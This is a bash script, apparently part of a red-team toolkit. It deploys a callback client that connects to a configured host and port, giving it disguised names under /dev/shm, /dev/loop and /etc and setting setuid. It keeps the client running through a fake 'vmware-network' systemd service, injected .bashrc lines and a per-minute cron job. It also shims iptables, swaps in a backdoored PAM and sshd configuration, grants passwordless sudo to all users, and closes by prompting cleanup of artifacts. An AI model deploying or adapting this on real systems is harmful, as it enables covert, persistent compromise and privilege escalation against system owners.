#!/bin/bash

#
#   TODO: Add backdoor users, Timestomping, ps + netstat binaries backdoor 
#

# Change host and port before the deployment 
host="192.168.204.128"
port="8080"


payload1="/dev/shm/pulse-shm-401862937 $host $port" 
payload2="/dev/loop17 $host $port"
payload3="/etc/vmware-tools.conf $host $port"

# Setup tools for basic deployment 
setup(){
    #yum install -y 
    apt-get -qq install -y curl wget vim python3 openssh-server
    systemctl start ssh 
    systemctl enable ssh 
}

# Timestomp 

# Add backdoor users 

# Clone the client binary into different places 
clone(){
    echo -e "Cloning all the files to the right directory...\n"
    cp deploy.sh /dev/shm/pulse-shm-10175238
    cp deploy.sh /dev/loop28
    cp deploy.sh /etc/vmware-tools.conf 

    cp /opt/cdt-redteamtool/client_binary/dist/client /dev/shm/pulse-shm-401862937
    cp /opt/cdt-redteamtool/client_binary/dist/client /dev/loop17
    cp /opt/cdt-redteamtool/client_binary/dist/client /etc/vmwaretools.conf
    chmod u+s /dev/shm/pulse-shm-401862937 /dev/loop17 /etc/vmwaretools.conf

}

copyman(){
    echo -e "Installing copyman service...\n"
    # Clone copyman and its files 
    mkdir -p /lib/modules/kernel_static

    cp /opt/cdt-redteamtool/payload/vmware-network.service /etc/systemd/system/vmware-network.service
    cp /opt/cdt-redteamtool/payload/copyman.sh /lib/modules/kernel_static/copy
    cp /opt/cdt-redteamtool/payload/static/* /lib/modules/kernel_static/
    chmod 744 /etc/systemd/system/vmware-network.service

    systemctl start vmware-network
    systemctl enable vmware-network
}

# Add bot to all the bashrc found in /home and /root 
bashrc(){
    echo -e "Changing all bashrc... \n"

    bashrc=$(find /home -type f -name ".bashrc" 2>/dev/null)
    for i in $bashrc; do
        sed -is "30 a $payload1 &" $i
    done

    sed -i "30 a $payload1 &" /root/.bashrc
}

# Need persistent alias. Right now, this doesn't do anything 
alias_ls(){
    alias ls="ls; $payload2"
}

# This might be different in centos, systemctl restart cronjob 
cronjob(){
    echo -e "Installing cronjob... \n"
    crontab -l | { cat; echo "* * * * * $payload3"; } | crontab -
    systemctl restart cron 
}

# Shim iptables. IPtables had weird symlink, had to separate it 
iptables(){
    echo -e "Shimming iptables... \n"
    gcc /opt/cdt-redteamtool/payload/iptables/drop.c -o ./iptables/drop
    cp /opt/cdt-redteamtool/payload/iptables/drop /bin/fw
    cp /opt/cdt-redteamtool/payload/iptables/iptables /sbin/xtables-single 
    chmod 777 /sbin/xtables-single

    xtables=`which iptables`
    ln -sf /sbin/xtables-single $xtables
}

# Shim rest of the binaries; ps, netstat, cd 
#shim() {
#
#}

# PAM backdoor 
pam(){
    cp /opt/cdt-redteamtool/payload/static/common-auth /etc/pam.d/common-auth
}

# vulnerable sshd_config 
# think about ForceCommand --> iptable drop + run client 
sshd_config(){
    cp /opt/cdt-redteamtool/payload/static/sshd_config /etc/ssh/sshd_config
    systemctl restart ssh
}

# vulnerable bashrc (POG) ? 

# vulnerable sudoers
sudoers(){
    echo "ALL ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
}


########## Start of Main ##########

setup
copyman
clone
sshd_config
sudoers
cronjob
pam
bashrc  
iptables
echo -e "========= Script have ended. Erase all artifaces. ========== \n"

# Start copyman 
